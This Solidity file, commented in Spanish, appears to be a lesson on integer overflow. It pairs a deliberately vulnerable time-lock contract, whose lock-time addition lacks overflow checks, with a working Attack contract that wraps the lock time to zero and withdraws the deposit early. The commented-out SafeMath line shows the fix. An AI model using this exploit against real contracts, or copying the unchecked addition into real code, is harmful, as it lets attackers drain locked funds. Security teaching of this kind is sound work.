// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// pragma solidity ^0.8.3;

/*
Este contrato está diseñado para actuar como una bóveda de tiempo.
El usuario puede depositar en este contrato pero no puede retirarse durante al menos una semana.
El usuario también puede extender el tiempo de espera más allá del período de espera de 1 semana.

1. Deploy TimeLock
2. Deploy Attack con el address de TimeLock
3. Invocar Attack.attack enviando 1 ether. Inmediatamente podrásretira tu ether.

¿Qué sucedió?
El ataque hizo que TimeLock.lockTime se desbordara y pudo retirarse
antes del período de espera de 1 semana.
*/

// importamos librerías SafeMath de OpenZeppelin
// REMIX
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";
// TRUFFLE
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
        // suma SafeMath
        // lockTime[msg.sender] = SafeMath.add(lockTime[msg.sender] , _secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        si t = tiempo de bloqueo actual, entonces necesitamos encontrar x tal que
        x + t = 2**256 = 0
        entonces x = -t
        2**256 = type(uint).max + 1
        entonces x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );

        timeLock.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
